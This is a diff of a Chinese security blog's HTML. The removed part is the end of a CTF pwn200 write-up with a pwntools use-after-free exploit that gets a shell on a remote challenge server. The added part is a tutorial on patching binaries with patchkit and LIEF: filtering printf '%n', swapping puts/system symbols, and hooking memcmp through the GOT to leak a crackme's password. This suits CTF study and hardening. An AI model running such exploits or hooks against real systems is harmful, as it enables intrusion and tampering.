-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937226801kdjz5ggb.png?imageslim" alt="paste image"></p>
-<p>所以我们在拿到那两块内存后，把开始 8 字节写成 <code>getshell-8</code> 函数的地址就行了。（减8的原因看下图）<br>然后使用 <code>1</code> 功能，就能调用了。</p>
-<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937318915n5tt0od8.png?imageslim" alt="paste image"></p>
-<p>exp中把 开始 8 字节改成了  <code>0x0602D50</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509946173632ju0gczy8.png?imageslim" alt="paste image"><br>exp:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># p = process(&quot;./p200&quot;)</div><div class="line">p = remote(&quot;106.75.8.58&quot;, 12333)</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">get_shell = p64(0x0602D50)</div><div class="line"></div><div class="line">payload = get_shell</div><div class="line">payload += &quot;A&quot; * (48 - len(payload))</div><div class="line"></div><div class="line"># gdb.attach(p)</div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&apos;3&apos;)</div><div class="line"># 先释放掉那两个块</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line">sleep(0.5)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"># 分配两个块，占用刚刚释放的块， 开始8字节 为 0x0602D50</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>使用方式：<code>./patch binary_file patch.py</code></p>
+<p>过滤printf中 %n 的脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">def replace_free(pt):</div><div class="line">    printf_addr = 0x400548;// call printf 时的地址</div><div class="line">    new_printf = pt.inject(c=r&apos;&apos;&apos;</div><div class="line">void fix_printf(char *fmt) &#123;</div><div class="line">    for (int i = 0; fmt[i]; ++i)</div><div class="line">    &#123;</div><div class="line">        if (fmt[i] == &apos;%&apos; &amp;&amp; fmt[i+1] == &apos;n&apos;) &#123;</div><div class="line">           //找到后，通过前移的方式删除字符，每次删掉一个。</div><div class="line">            int len=0;</div><div class="line">            int j;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            len=0;</div><div class="line">            while(fmt[len++])&#123;</div><div class="line">            &#125;</div><div class="line">            for(j=i;j&lt;len-1;j++)</div><div class="line">                fmt[j] = fmt[j+1];</div><div class="line">            </div><div class="line">            fmt[len-1] = &apos;\x00&apos;;</div><div class="line">            //i--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(printf_addr, new_printf);</div></pre></td></tr></table></figure>
+<p>64位程序，修改 malloc函数的参数为 <code>0x20</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x040057A;  //call malloc的位置</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov rdi,0x20</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr, new_malloc);</div></pre></td></tr></table></figure></p>
+<p>32位，由于与栈进行操作，要注意保存还原返回地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    pop eax</div><div class="line">    pop ebx</div><div class="line">    push 0x20</div><div class="line">    push eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def replace(pt):</div><div class="line">    malloc_addr = 0x08048454;</div><div class="line">    new_malloc = pt.inject(asm=r&apos;&apos;&apos;</div><div class="line">    mov eax,0x20</div><div class="line">    mov [esp+4], eax</div><div class="line">    ret</div><div class="line">    &apos;&apos;&apos;)</div><div class="line">    pt.hook(malloc_addr,new_malloc);</div></pre></td></tr></table></figure>
+<h4 id="LIEF"><a href="#LIEF" class="headerlink" title="LIEF"></a>LIEF</h4><p>程序地址：<a href="https://github.com/lief-project/LIEF" target="_blank" rel="external">https://github.com/lief-project/LIEF</a></p>
+<p>使用这个工具可以很方便的 patch <code>elf</code>， <code>pe</code>，<code>MachO</code> 文件。本文以<code>elf</code>  为例。</p>
+<p><strong>通过交换导入导出符号</strong></p>
+<p>首先看第一个测试程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">  puts(&quot;/bin/sh&quot;);</div><div class="line">  return EXIT_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>我们的目标是让他调用 <code>puts</code> 变成调用 <code>system</code></p>
+<p><strong>方案一</strong></p>
+<p>修改 libc 中的相关符号，然后使用 <code>LD_LIBRARY_PATH</code> 加载我们修改后的库。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line">libc = lief.parse(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, libc.dynamic_symbols)[0]</div><div class="line">system_sym = filter(lambda e: e.name == &quot;system&quot;, libc.dynamic_symbols)[0]</div><div class="line"></div><div class="line"># swap them</div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line">system_sym.name = &quot;puts&quot;</div><div class="line">libc.write(&quot;libc.so.6&quot;)</div><div class="line"></div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
+<p>首先拿到 puts 和 system 符号对象，然后交换他们的名称。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064081347di3rwx94.png?imageslim" alt="paste image"><br>成功</p>
+<p><strong>方案二</strong></p>
+<p>直接修改目标文件的导入符号，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">hashme = lief.parse(&quot;hashme&quot;)</div><div class="line"></div><div class="line"># get puts, system symbol</div><div class="line">puts_sym = filter(lambda e: e.name == &quot;puts&quot;, hashme.imported_symbols)[0]</div><div class="line"></div><div class="line"># set puts to system </div><div class="line">puts_sym.name = &quot;system&quot;</div><div class="line"></div><div class="line">hashme.write(&quot;hashme.patch&quot;)</div><div class="line">print(&quot;done&quot;)</div></pre></td></tr></table></figure>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510064333755d675x70o.png?imageslim" alt="paste image"></p>
+<p><strong>直接增加代码进行patch</strong></p>
+<h6 id="修改库函数"><a href="#修改库函数" class="headerlink" title="修改库函数"></a>修改库函数</h6><p>测试程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;math.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">  if (argc != 2) &#123;</div><div class="line">    printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</div><div class="line">    exit(-1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  int a = atoi(argv[1]);</div><div class="line">  printf(&quot;exp(%d) = %f\n&quot;, a, exp(a));</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>目标是hook <code>exp</code> 函数，直接增加一个 <code>segments</code> , 然后劫持函数指针到这里。首先编译一个 <code>lib</code> 用来提供用于 <code>hook</code> 的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div></pre></td></tr></table></figure>
+<p>hook.c 的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">double hook(double x) &#123;</div><div class="line">  return x + 100;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后看脚本内容，很清晰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import lief</div><div class="line"></div><div class="line">libm = lief.parse(&quot;/lib/x86_64-linux-gnu/libm-2.23.so&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = libm.add(hook.segments[0])</div><div class="line"></div><div class="line">print(&quot;Hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_added.virtual_address))</div><div class="line"></div><div class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</div><div class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</div><div class="line"></div><div class="line">exp_symbol.value = segment_added.virtual_address + hook_symbol.value</div><div class="line"></div><div class="line">libm.write(&quot;libm.so.6&quot;)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065215828nuiov7ys.png?imageslim" alt="paste image"></p>
+<h5 id="通过-got-plt-表-直接劫持程序"><a href="#通过-got-plt-表-直接劫持程序" class="headerlink" title="通过 got/plt 表 直接劫持程序"></a>通过 got/plt 表 直接劫持程序</h5><p>测试程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">// Damn_YoU_Got_The_Flag</div><div class="line">char password[] = &quot;\x18\x3d\x31\x32\x03\x05\x33\x09\x03\x1b\x33\x28\x03\x08\x34\x39\x03\x1a\x30\x3d\x3b&quot;;</div><div class="line"></div><div class="line">inline int check(char* input);</div><div class="line"></div><div class="line">int check(char* input) &#123;</div><div class="line">  for (int i = 0; i &lt; sizeof(password) - 1; ++i) &#123;</div><div class="line">    password[i] ^= 0x5c;</div><div class="line">  &#125;</div><div class="line">  return memcmp(password, input, sizeof(password) - 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line"></div><div class="line">  if (check(argv[1]) == 0) &#123;</div><div class="line">    puts(&quot;You got it !!&quot;);</div><div class="line">    return EXIT_SUCCESS;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  puts(&quot;Wrong&quot;);</div><div class="line">  return EXIT_FAILURE;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><code>hook.c</code> 内容，hook memcpy, 打印内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &quot;arch/x86_64/syscall.c&quot;</div><div class="line">#define stdout 1</div><div class="line"></div><div class="line">//gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div><div class="line"></div><div class="line">int my_memcmp(const void* lhs, const void* rhs, int n) &#123;</div><div class="line">  const char msg[] = &quot;Hook add\n&quot;;</div><div class="line">  _write(stdout, msg, sizeof(msg));</div><div class="line">  _write(stdout, (const char*)lhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  _write(stdout, (const char*)rhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>hook 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">crackme = lief.parse(&quot;crackme.bin&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = crackme.add(hook.segments[0])</div><div class="line"></div><div class="line">my_memcmp = hook.get_symbol(&quot;my_memcmp&quot;)</div><div class="line">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</div><div class="line"></div><div class="line">crackme.patch_pltgot(&apos;memcmp&apos;, my_memcmp_addr)</div><div class="line">crackme.write(&quot;crackme.hooked&quot;)</div></pre></td></tr></table></figure></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065926275fzlkcrtw.png?imageslim" alt="paste image"><br>参考：</p>
+<p><a href="https://lief.quarkslab.com/doc/tutorials/" target="_blank" rel="external">https://lief.quarkslab.com/doc/tutorials/</a></p>
+<p><a href="https://github.com/lunixbochs/patchkit" target="_blank" rel="external">https://github.com/lunixbochs/patchkit</a></p>
+
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
                     <p><strong>
@@ -580,7 +584,7 @@
                             <a> 转载注明来源</a>
                         </strong>
                         <br>
-                        <strong>本文链接：</strong><a href="http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html">http://jinyu00.github.io/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html</a>
+                        <strong>本文链接：</strong><a href="http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html">http://jinyu00.github.io/文件patch/2017-11-07-可执行文件patch技术-持续更新.html</a>
                     </p>
                 </blockquote>
         
@@ -630,21 +634,13 @@
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/文件patch/2017-11-07-可执行文件patch技术-持续更新.html" id="post_nav-newer" class="prev-content">
-            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
-                <i class="material-icons">arrow_back</i>
-            </button>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-            新篇
-        </a>
-    
 
     <!-- Section Spacer -->
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
     
-        <a href="/路由器安全/2017-10-27-MIPS-rop-gadgets记录贴-持续更新.html" id="post_nav-older" class="next-content">
+        <a href="/ctf/2017-11-05-上海ctf2017-pwn100-pwn200.html" id="post_nav-older" class="next-content">
             旧篇
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
